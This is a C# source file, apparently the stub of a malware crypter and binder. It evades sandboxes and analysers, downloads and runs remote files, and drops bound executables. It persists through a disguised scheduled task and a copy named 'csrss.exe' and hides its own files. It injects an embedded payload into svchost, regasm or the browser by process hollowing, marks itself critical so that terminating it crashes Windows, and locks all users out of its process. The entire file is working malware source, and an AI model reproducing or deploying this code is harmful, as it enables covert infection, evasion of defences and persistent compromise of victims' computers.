﻿using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Collections.Generic;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace StubCode
{
    class Program
    {
        static ResourceManager res;

        static void Main(string[] args)
        {
            try
            {
                res = new ResourceManager("STUB", typeof(Program).Assembly);
                if (args.Length == 0)
                {
                    if (GetSetting<bool>("AntiSandboxie"))
                        DetectSandboxie();
                    if (GetSetting<bool>("AntiWS"))
                        DetectWireshark();
                    if (GetSetting<bool>("AntiEmulation"))
                        DetectWPE();
                    if (GetSetting<bool>("AntiWPE"))
                        DetectEmulation();

                    if (GetSetting<bool>("DeleteZoneID"))
                    {
                        Process zp = new Process();
                        zp.StartInfo.FileName = "cmd.exe";
                        zp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        zp.StartInfo.Arguments = "/c echo [zoneTransfer]ZoneID = 2 > \"" + Application.ExecutablePath + "\":ZONE.identifier & exit";
                        zp.Start();
                        zp.WaitForExit();
                    }

                    if (GetSetting<bool>("MessageEnabled"))
                        if (GetSetting<bool>("MessageAlways") || !GetSetting<bool>("StartupEnabled") || !IsInStartupFolder())
                            MessageBox.Show(GetSetting<string>("MessageText"), GetSetting<string>("MessageText"), (MessageBoxButtons)Enum.GetValues(typeof(MessageBoxButtons)).GetValue(GetSetting<int>("MessageButtonID")), (MessageBoxIcon)Enum.GetValues(typeof(MessageBoxIcon)).GetValue(GetSetting<int>("MessageIconID")));

                    for (int i = 0; i < GetSetting<int>("BD"); i++)
                    {
                        try
                        {
                            object[] bdata = GetSetting<object[]>("BIND" + i.ToString());
                            File.WriteAllBytes(GetPath((string)bdata[1]) + "\\" + bdata[4], (byte[])bdata[0]);
                            if ((string)bdata[2] != "Never" && ((GetSetting<bool>("StartupEnabled") && !IsInStartupFolder()) || (string)bdata[2] == "Always"))
                            {
                                Thread.Sleep((int)bdata[3] * 1000);
                                Process.Start(GetPath((string)bdata[1]) + "\\" + bdata[4]);
                            }
                        }
                        catch { }
                    }

                    for (int i = 0; i < GetSetting<int>("DL"); i++)
                    {
                        object[] ddata = GetSetting<object[]>("DOWN" + i.ToString());
                        string name = ((string)ddata[0]).Substring(((string)ddata[0]).LastIndexOf("/"));
                        if (File.Exists(GetPath((string)ddata[1]) + "\\" + name))
                            try
                            {
                                File.Delete(GetPath((string)ddata[1]) + "\\" + name);
                            }
                            catch
                            {
                                continue;
                            }
                        try
                        {
                            new WebClient().DownloadFile((string)ddata[0], GetPath((string)ddata[1]) + "\\" + name);
                            if ((string)ddata[2] != "Never" && ((GetSetting<bool>("StartupEnabled") && !IsInStartupFolder()) || (string)ddata[2] == "Always"))
                            {
                                Thread.Sleep((int)ddata[3] * 1000);
                                Process.Start(GetPath((string)ddata[1]) + "\\" + name);
                            }
                        }
                        catch { }
                    }

                    if (GetSetting<bool>("StartupEnabled") && !IsInStartupFolder())
                    {
                        try
                        {
                            if (File.Exists(GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName")))
                                try
                                {
                                    File.Delete(GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"));
                                }
                                catch { }
                            string[] fdata = GetSetting<string>("StartupFileName").Split('\\');
                            string curloc = GetPath(GetSetting<string>("StartupLocation"));
                            for (int i = 0; i < fdata.Length - 1; i++)
                            {
                                curloc += "\\" + fdata[i];
                                if (!Directory.Exists(curloc))
                                    Directory.CreateDirectory(curloc);
                            }
                            if (GetSetting<bool>("StartupMeltEnabled"))
                                File.Move(Application.ExecutablePath, GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"));
                            else
                                File.Copy(Application.ExecutablePath, GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"), true);
                            if (GetSetting<bool>("CreationDateEnabled"))
                                try
                                {
                                    File.SetCreationTime(GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"), GetSetting<DateTime>("CreationDateValue"));
                                }
                                catch { }
                            Process.Start(GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"));
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                    if (GetSetting<bool>("StartupEnabled"))
                        AddToStartup();

                    if (GetSetting<bool>("HideFile"))
                        try
                        {
                            new FileInfo(Application.ExecutablePath).Attributes = FileAttributes.Hidden | FileAttributes.System;
                        }
                        catch { }
                    if (GetSetting<bool>("HideFolder"))
                        try
                        {
                            string[] fdata = GetSetting<string>("StartupFileName").Split('\\');
                            string curloc = GetPath(GetSetting<string>("StartupLocation"));
                            for (int i = 0; i < fdata.Length - 1; i++)
                            {
                                curloc += "\\" + fdata[i];
                                try
                                {
                                    new DirectoryInfo(curloc).Attributes = FileAttributes.Hidden | FileAttributes.System;
                                }
                                catch { }
                            }
                        }
                        catch { }

                    byte[] mainfile = GetSetting<byte[]>("MAIN");
                    if (GetSetting<bool>("CompGZIP"))
                        mainfile = Decompress(mainfile);
                    int handle = Process.GetCurrentProcess().Id;
                    if (!GetSetting<bool>("ForceNet"))
                        handle = Run(mainfile, GetSetting<string>("CMDArguments"), GetInjectionPath(GetSetting<string>("InjectLoc")));

                    if (GetSetting<bool>("ElevatedProcess"))
                        ElevateProcess(IdToPtr(handle));

                    if (GetSetting<bool>("BSOD"))
                        try
                        {
                            Process.EnterDebugMode();
                            CriticalProcess(IdToPtr(handle));
                        }
                        catch { }

                    if (GetSetting<bool>("ProcessPersistence") || GetSetting<bool>("StartupPersistence"))
                    {
                        try
                        {
                            File.Copy(Application.ExecutablePath, Path.GetTempPath() + "csrss.exe", true);
                            Process.Start(Path.GetTempPath() + "csrss.exe", (GetSetting<bool>("ProcessPersistence") ? "-p " + "\"" + Application.ExecutablePath + "\" " + handle.ToString() + " " : "") + (GetSetting<bool>("StartupPersistence") ? "-s" : ""));
                        }
                        catch { }
                    }

                    if (GetSetting<bool>("ForceNet"))
                    {
                        try
                        {
                            MethodInfo minfo = Assembly.Load(mainfile).EntryPoint;
                            object[] pargs = null;
                            try
                            {
                                if (minfo.GetParameters().Length == 1)
                                {
                                    pargs = new object[1];
                                    if (!string.IsNullOrEmpty(GetSetting<string>("CMDArguments")))
                                        pargs[0] = GetSetting<string>("CMDArguments").Split(' ');
                                    else
                                        pargs[0] = new string[0];
                                }
                            }
                            catch { }
                            Thread invt = new Thread(delegate () { minfo.Invoke(null, pargs); });
                            invt.SetApartmentState(ApartmentState.STA);
                            invt.Start();
                            invt.Join();
                        }
                        catch { }
                    }
                }
                else
                {
                    if (args[0] == "/S")
                        Main(new string[0]);
                    ElevateProcess(Process.GetCurrentProcess().Handle);
                    try
                    {
                        Process.EnterDebugMode();
                        CriticalProcess(Process.GetCurrentProcess().Handle);
                    }
                    catch { }
                    for (int i = 0; i < args.Length; i += 3)
                        switch (args[i])
                        {
                            case "-p":
                            ProcessPersistance(args[i + 1], int.Parse(args[i + 2]));
                            break;

                            case "-s":
                            StartupPersistence();
                            break;
                        }
                    while (true)
                        Thread.Sleep(10000);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private static void StartupPersistence()
        {
            new Thread(new ThreadStart(delegate ()
            {
                while (true)
                {
                    AddToStartup();
                    Thread.Sleep(2000);
                }
            })).Start();
        }

        private static void ProcessPersistance(string path, int handle)
        {
            new Thread(new ThreadStart(delegate ()
            {
                while (true)
                {
                    bool ok = false;
                    foreach (Process p in Process.GetProcesses())
                        try
                        {
                            if (p.Id == handle)
                            {
                                ok = true;
                                break;
                            }
                        }
                        catch { }
                    if (ok)
                        Thread.Sleep(500);
                    else
                    {
                        Process.Start(path);
                        Environment.Exit(0);
                    }
                }
            })).Start();
        }

        private static T GetSetting<T>(string name)
        {
            return (T)res.GetObject(name);
        }

        private static string GetInjectionPath(string path)
        {
            switch (path)
            {
                case "Itself":
                return Application.ExecutablePath;

                case "Vbc":
                return Environment.GetEnvironmentVariable("WinDir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";

                case "Svchost":
                return Environment.GetEnvironmentVariable("WinDir") + "\\System32\\svchost.exe";

                case "Regasm":
                return Environment.GetEnvironmentVariable("WinDir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe";

                case "Browser":
                string ret = GetDefaultBrowser();
                if (string.IsNullOrEmpty(ret))
                    goto case "Itself";
                else
                    return ret;

                default:
                try
                {
                    string newpath = Path.GetTempPath() + path;
                    File.Copy(Environment.GetEnvironmentVariable("WinDir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", newpath, true);
                    return newpath;
                }
                catch
                {
                    goto case "Itself";
                }
            }
        }

        private static string GetDefaultBrowser()
        {
            using (RegistryKey userChoiceKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice"))
            {
                if (userChoiceKey == null)
                    return "";
                object progIdValue = userChoiceKey.GetValue("Progid");
                if (progIdValue == null)
                    return "";
                using (RegistryKey pathKey = Registry.ClassesRoot.OpenSubKey(progIdValue.ToString() + "\\shell\\open\\command"))
                {
                    if (pathKey == null)
                        return "";
                    try
                    {
                        string path = pathKey.GetValue(null).ToString().ToLower().Replace("\"", "");
                        if (!path.EndsWith(".exe"))
                            path = path.Substring(0, path.LastIndexOf(".exe", StringComparison.Ordinal) + 4);
                        return path;
                    }
                    catch
                    {
                        return "";
                    }
                }
            }
        }

        private static IntPtr IdToPtr(int id)
        {
            foreach (Process p in Process.GetProcesses())
                try
                {
                    if (p.Id == id)
                        return p.Handle;
                }
                catch { }
            return IntPtr.Zero;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private static void CriticalProcess(IntPtr handle)
        {
            try
            {
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
            }
            catch { }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In()]
        byte[] pSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out()]
        byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

        static void ElevateProcess(IntPtr handle)
        {
            try
            {
                byte[] buff = new byte[0];
                uint setblock = 0;
                GetKernelObjectSecurity(handle, 0x4, buff, 0, ref setblock);
                buff = new byte[setblock];
                GetKernelObjectSecurity(handle, 0x4, buff, setblock, ref setblock);
                RawSecurityDescriptor des = new RawSecurityDescriptor(buff, 0);
                des.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0xf0000 | 0x100 | 0xfff), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
                buff = new byte[des.BinaryLength];
                des.GetBinaryForm(buff, 0);
                SetKernelObjectSecurity(handle, 0x4, buff);
            }
            catch { }
        }

        private static void AddToStartup()
        {
            if (GetSetting<bool>("StartupEnabled"))
            {
                string xmlf = GetSetting<string>("TASK");
                xmlf = xmlf.Replace("%USER%", WindowsIdentity.GetCurrent().Name).Replace("%COMMAND%", GetPath(GetSetting<string>("StartupLocation")) + "\\" + GetSetting<string>("StartupFileName"));
                string stpf = Path.GetTempPath() + new Random().Next() + ".xml";
                File.WriteAllText(stpf, xmlf);
                Process stp = new Process();
                stp.StartInfo.CreateNoWindow = true;
                stp.StartInfo.FileName = "schtasks.exe";
                stp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                stp.StartInfo.Arguments = "/Create /TN \"Update\\" + GetSetting<string>("StartupEntryName") + "\" /XML \"" + stpf + "\"";
                stp.Start();
                stp.WaitForExit();
                File.Delete(stpf);
            }
        }

        private static byte[] Decompress(byte[] data)
        {
            using (MemoryStream st = new MemoryStream(data))
            {
                using (GZipStream g = new GZipStream(st, CompressionMode.Decompress))
                {
                    byte[] buffer = new byte[data.Length * 5];
                    Array.Resize(ref buffer, g.Read(buffer, 0, buffer.Length));
                    return buffer;
                }
            }
        }

        private static bool IsInStartupFolder()
        {
            if (GetSetting<string>("StartupLocation") == "CurrentFolder")
                return true;
            string[] fdata = GetSetting<string>("StartupFileName").Split('\\');
            string curloc = GetPath(GetSetting<string>("StartupLocation"));
            for (int i = 0; i < fdata.Length - 1; i++)
                curloc += "\\" + fdata[i];
            return Application.StartupPath == curloc;
        }

        private static string GetPath(string path)
        {
            if (path == "CurrentFolder")
                return Application.StartupPath;
            else
            {
                string[] names = Enum.GetNames(typeof(Environment.SpecialFolder));
                for (int i = 0; i < names.Length; i++)
                    if (names[i] == path)
                        return Environment.GetFolderPath((Environment.SpecialFolder)Enum.GetValues(typeof(Environment.SpecialFolder)).GetValue(i));
            }
            return "";
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        private static void DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Environment.Exit(1);
            }
        }
        private static void DetectEmulation()
        {
            long tickCount = Environment.TickCount;
            Thread.Sleep(500);
            long tickCount2 = Environment.TickCount;
            if (((tickCount2 - tickCount) < 500L))
            {
                Environment.Exit(1);
            }
        }

        private static void DetectWPE()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("WPE PRO"))
                {
                    Environment.Exit(1);
                }
            }
        }

        private static void DetectWireshark()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
                {
                    Environment.Exit(1);
                }
            }
        }

        [DllImport("kernel32.dll")]
        static extern bool CreateProcess(string lpApplicationName,
        string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        byte[] lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
           uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("ntdll.dll")]
        private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, [In] ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, [In] ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp;
            public UInt16 e_cp;
            public UInt16 e_crlc;
            public UInt16 e_cparhdr;
            public UInt16 e_minalloc;
            public UInt16 e_maxalloc;
            public UInt16 e_ss;
            public UInt16 e_sp;
            public UInt16 e_csum;
            public UInt16 e_ip;
            public UInt16 e_cs;
            public UInt16 e_lfarlc;
            public UInt16 e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;
            public UInt16 e_oemid;
            public UInt16 e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;
            public Int32 e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS
        {
            public UInt32 Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        private struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public UInt32 Characteristics;
        }

        private static int Run(byte[] file, string cmd, string location)
        {
            GCHandle gHandle = GCHandle.Alloc(file, GCHandleType.Pinned);
            int iPointer;
            uint outtt;
            UIntPtr outt;
            iPointer = gHandle.AddrOfPinnedObject().ToInt32();
            CONTEXT CTX = new CONTEXT();
            IMAGE_DOS_HEADER DHD = new IMAGE_DOS_HEADER();
            IMAGE_NT_HEADERS NHD = new IMAGE_NT_HEADERS();
            IMAGE_SECTION_HEADER SHD = default(IMAGE_SECTION_HEADER);
            PROCESS_INFORMATION procinf = new PROCESS_INFORMATION();
            DHD = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer), typeof(IMAGE_DOS_HEADER));
            NHD = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew), typeof(IMAGE_NT_HEADERS));
            CreateProcess(location, cmd, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, new byte[0x44], out procinf);
            NtUnmapViewOfSection(procinf.hProcess, (IntPtr)NHD.OptionalHeader.ImageBase);
            if (VirtualAllocEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), NHD.OptionalHeader.SizeOfImage, 0x1000 | 0x2000, 0x40) == IntPtr.Zero)
            {
                TerminateProcess(procinf.hProcess, 0);
                return Run(file, cmd, location);
            }
            CTX.ContextFlags = (0x10000 | 0x01) | (0x10000 | 0x02) | (0x10000 | 0x04);
            if (IntPtr.Size == 4)
                GetThreadContext(procinf.hThread, ref CTX);
            else
                Wow64GetThreadContext(procinf.hThread, ref CTX);
            WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), file, NHD.OptionalHeader.SizeOfHeaders, out outt);
            for (int a = 0; a < NHD.FileHeader.NumberOfSections; a++)
            {
                SHD = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew + Marshal.SizeOf(NHD) + (a * Marshal.SizeOf(SHD))), typeof(IMAGE_SECTION_HEADER));
                byte[] bRaw = new byte[SHD.SizeOfRawData + 1];
                for (int y = 0; y < (int)SHD.SizeOfRawData; y++)
                    bRaw[y] = file[SHD.PointerToRawData + y];
                WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), bRaw, Convert.ToUInt32(SHD.SizeOfRawData), out outt);
                VirtualProtectEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), SHD.VirtualSize, 0x40, out outtt);
            }
            byte[] bIB = BitConverter.GetBytes(NHD.OptionalHeader.ImageBase);
            WriteProcessMemory(procinf.hProcess, new IntPtr(CTX.Ebx + 8), bIB, (uint)bIB.Length, out outt);
            CTX.Eax = (NHD.OptionalHeader.ImageBase + NHD.OptionalHeader.AddressOfEntryPoint);
            if (IntPtr.Size == 4)
                SetThreadContext(procinf.hThread, ref CTX);
            else
                Wow64SetThreadContext(procinf.hThread, ref CTX);
            ResumeThread(procinf.hThread);
            return procinf.dwProcessId;
        }
    }
}
